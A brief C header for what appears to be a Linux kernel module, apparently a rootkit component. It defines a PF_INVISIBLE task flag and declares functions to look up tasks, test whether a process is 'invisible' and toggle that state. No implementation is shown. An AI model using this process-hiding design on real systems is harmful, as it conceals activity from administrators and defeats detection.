#ifndef OSCW_PROC_H_
#define OSCW_PROC_H_

#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/proc_ns.h>

#define PF_INVISIBLE 0x01000000

struct task_struct *
find_task_struct(pid_t pid);

int
is_invisible_pid(pid_t pid);
int
is_invisible_task_struct(struct task_struct *task);

void
toggle_proc_invisability(struct task_struct *task);

#endif // OSCW_PROC_H_
